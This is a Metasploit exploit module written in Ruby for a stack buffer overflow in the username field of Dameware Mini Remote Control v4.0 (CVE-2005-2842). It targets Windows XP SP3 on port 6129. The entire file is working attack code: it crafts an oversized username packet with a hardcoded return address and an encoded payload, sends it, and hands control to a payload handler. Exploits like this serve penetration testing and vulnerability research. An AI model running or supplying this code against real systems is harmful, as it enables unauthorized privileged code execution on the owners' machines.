require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Dameware Mini Remote Control Username Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack based buffer overflow vulnerability found
				in Dameware Mini Remote Control v4.0. The overflow is caused when sending
				an overly long username to the DWRCS executable listening on port 6129.
				The username is read into a strcpy() function causing an overwrite of
				the return pointer leading to arbitrary code execution.
			},
			'Author'         => [ 'James Fitts' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'CVE', '2005-2842' ],
					[ 'BID', '14707' ],
					[ 'URL', 'http://secunia.com/advisories/16655' ],
					[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2005-08/1074.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'	=> 140,
					'BadChars' => "\x00\x0a\x0d",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
					'Compat'        =>
						{
							'SymbolLookup' => '+ws2ord',
						},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 
						'Windows XP SP3 EN', 
							{ 
								# msvcrt.dll
								# push esp/ retn
								'Ret' => 0x77c35459, 
							} 
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Sept 01 2005'))

		register_options(
			[
				Opt::RPORT(6129),
			], self.class )
	end

	def pkt1
		p = payload.encoded

		boom = "\x43" * 259
		boom[100, 4] = [target.ret].pack('V')
		boom[108, p.length] = p

		packet = "\x00" * 4056
		packet[0, 4] = "\x30\x11\x00\x00"
		packet[4, 4] = "\x00\x00\x00\x00"
		packet[8, 4] = "\xd7\xa3\x70\x3d"
		packet[12, 4] = "\x0a\xd7\x0d\x40"
		packet[16, 20] = "\x00" * 20
		packet[36, 4] = "\x01\x00\x00\x00"

		packet[40, 4] = [0x00002710].pack('V')
		packet[196, 259] = rand_text_alpha(259)
		packet[456, 259] = boom
		packet[716, 259] = rand_text_alpha(259)
		packet[976, 259] = rand_text_alpha(259)
		packet[1236, 259] = rand_text_alpha(259)
		packet[1496, 259] = rand_text_alpha(259)

		return packet
	end

	def pkt2
		packet = "\x00" * 4096
		packet[756, 259] = rand_text_alpha(259)

		return packet
		
	end

	def exploit
		connect

		sock.put(pkt1)
		sock.recv(1024)
		sock.put(pkt2)
		sock.recv(84)

		handler
		disconnect
	end

end
__END__